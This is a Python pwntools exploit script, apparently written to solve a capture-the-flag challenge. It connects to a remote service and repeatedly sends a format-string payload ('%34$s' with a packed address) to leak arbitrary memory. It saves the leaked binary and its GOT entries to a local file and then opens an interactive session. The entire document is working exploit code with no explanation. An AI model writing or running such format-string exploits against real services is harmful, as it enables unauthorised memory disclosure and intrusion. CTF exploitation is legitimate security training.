from pwn import *

target = remote('offsetcheck.deadface.io', 31337)


file1 = open('leaked_elf', 'ab')
base = 0x8048000
base = 0x804a000 #Use this one when leaking the GOT

while True:
    (target.recvuntil(b'sent to the buffer:'))
    payload = b'%' + str(34).encode('ascii') + b'$s' + b'zbcdefghij'
    payload += b'b' * (20 - len(payload))
    payload += p32(base)
    #print(my_input)
    target.sendline(payload)

    (target.recvuntil(b'Please enter what showed up in EIP:'))
    target.sendline(b'a')
    (target.recvuntil(b'Searching buffer:'))
    (target.recvuntil(b'\x00'))
    leak = target.recvuntil(b'...')
    print(leak)
    leak = leak.replace(b'...', b'').replace(b'zbcdefghij\x00', b'').replace(b'zbcdefghi\x00', b'').replace(b'zbcdefgh\x00', b'').replace(b'zbcdefg\x00', b'').replace(b'zbcdef\x00', b'').replace(b'zbcde\x00', b'').replace(b'zbcd\x00', b'').replace(b'zbc\x00', b'').replace(b'zb\x00', b'').replace(b'z\x00', b'')
    #print(leak[-1])
    if len(leak) > 1 and leak[-1] == 0:
        leak = leak[:-1]
        base -= 1
    if len(leak) != 10:    
        base += len(leak) + 1
        print(leak)
        print(hex(base))
        file1.write(leak + b'\x00')
    else:
        base += len(leak) + 1
        print(leak)
        print(hex(base))
        file1.write(leak)

target.interactive()